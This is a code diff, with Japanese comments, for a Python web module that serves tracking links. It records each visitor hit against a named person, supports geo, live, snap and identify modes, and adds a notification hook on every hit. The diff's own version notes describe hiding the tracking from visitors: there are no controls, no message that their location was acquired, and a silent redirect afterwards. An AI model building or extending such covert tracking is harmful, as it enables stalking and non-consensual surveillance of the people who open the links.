@@ -7,11 +7,9 @@ main.py の snsx と同じ場所で include する:
 /l/ 配下はこのモジュールが担当する（main.py の同名ルートより先に登録されるため）。
 認証・render・ヒット記録は main.py 側を遅延参照して使い回すので挙動がズレない。
 
-v2:
-  ・来訪者側の「マップ／開始／停止」を廃止（ui は 自動 / 無言 / 案内のみ）
-  ・取得できなかったときに出るボタンは「もう一度」だけ
-  ・一度でも測位できたら未取得判定に戻らない
-  ・「取得しました」を来訪者に見せない（取得後は静かに遷移）
+v3:
+  ・ヒット時に通知（notify）を投げるフックを追加
+  ・mode を全モード受けに（quiz / identify / redirect / geo も作れる）
 """
 from __future__ import annotations
 
@@ -65,6 +63,8 @@ UI_LABEL = {
     "ask": "案内の1行だけ出す",
 }
 
+VALID_MODES = ("page", "geo", "snap", "live", "quiz", "identify", "redirect")
+
 
 def _coerce(key, v):
     d = LIVE_DEFAULTS[key]
@@ -98,7 +98,6 @@ def live_cfg():
             if v is None or v == "":
                 continue
             out[k] = _coerce(k, v)
-    # 旧設定の map / full はここで自動に寄せる
     if out["ui"] not in UI_CHOICES:
         out["ui"] = ""
     out["wait_sec"] = max(3.0, min(float(out["wait_sec"]), 120.0))
@@ -261,6 +260,14 @@ def link_hit(code: str, request: Request):
         return PlainTextResponse("リンクが無効です", status_code=404)
     L = live_cfg()
     hid = _record_hit(request, code)
+
+    # ★ ヒット通知
+    try:
+        from . import notify
+        notify.hit_async(code, hid, request, link)
+    except Exception:
+        pass
+
     hrow = db.q1("SELECT nonce FROM link_hits WHERE id=?", (hid,))
     nonce = (hrow["nonce"] if hrow else "") or ""
     mode = (link["mode"] or "page")
@@ -555,9 +562,6 @@ def tracks_add(request: Request, person: str = Form(""), mode: str = Form("snap"
                interval: int = Form(15), dest: str = Form(""), note: str = Form(""),
                u=Depends(auth)):
     person = (person or "").strip()[:40] or "名無し"
-    # 直し：全モード受けに
-    VALID_MODES = ("page", "geo", "snap", "live", "quiz", "identify", "redirect")
-    ...
     mode = mode if mode in VALID_MODES else "page"
     code = _new_code()
     db.add_track(code, person, mode=mode, interval=_clamp_iv(interval),
@@ -596,7 +600,7 @@ def track_update_route(request: Request, code: str, person: str = Form(""),
     f = {}
     if person.strip():
         f["name"] = f["person"] = person.strip()[:40]
-    if mode in ("snap", "live"):
+    if mode in VALID_MODES:
         f["mode"] = mode
     if interval:
         f["interval"] = _clamp_iv(interval)
